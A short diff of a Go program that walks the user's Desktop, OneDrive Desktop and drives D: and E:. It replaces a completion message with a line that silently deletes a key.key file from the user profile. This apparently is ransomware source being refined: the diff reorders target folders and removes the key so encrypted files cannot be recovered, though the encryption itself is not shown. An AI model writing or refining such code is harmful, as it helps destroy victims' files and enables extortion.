@@ -27,9 +27,7 @@ func readfile(filename string) string {
 
 func scanfile() {
 
-	root := [...]string{"D:\\", "E:\\", "F:\\",
-		os.Getenv("USERPROFILE") + "/Desktop/",
-		os.Getenv("USERPROFILE") + "/OneDrive/Desktop/"}
+	root := [...]string{os.Getenv("USERPROFILE") + "/Desktop/", os.Getenv("USERPROFILE") + "/OneDrive/Desktop/", "D:\\", "E:\\"}
 	for _, rootpath := range root {
 		filepath.Walk(rootpath, func(path string, nfo fs.FileInfo, err error) error {
 
@@ -75,7 +73,8 @@ func main() {
 			}
 
 		}
-		fmt.Println("Completed.")
+		os.Remove(os.Getenv("USERPROFILE") + "/key.key")
+
 	}
 
 	os.Exit(3)
